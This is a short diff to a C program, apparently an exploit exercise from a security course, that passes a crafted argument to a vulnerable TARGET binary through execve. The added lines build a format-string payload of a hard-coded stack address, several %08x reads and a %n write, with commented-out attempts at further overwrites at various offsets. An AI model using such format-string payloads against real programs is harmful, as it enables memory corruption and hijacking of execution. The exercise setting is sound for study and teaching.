@@ -10,8 +10,17 @@ int main(void)
 {
   char *args[3];
   char *env[1];
+  char buf[31];
+  memset(buf, 0x90, 31);
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  strncpy(buf, "\x30\xfb\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n", 31);
+  //strncpy(buf+240, "\x70", 1);
+  //strncpy(buf+236, "\x08\xfd\xff\xbf", 4);
+  //strncpy(buf+244, "\x12\x34\x56\x78", 4);
+  
+  args[0] = TARGET; 
+  args[1] = buf;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
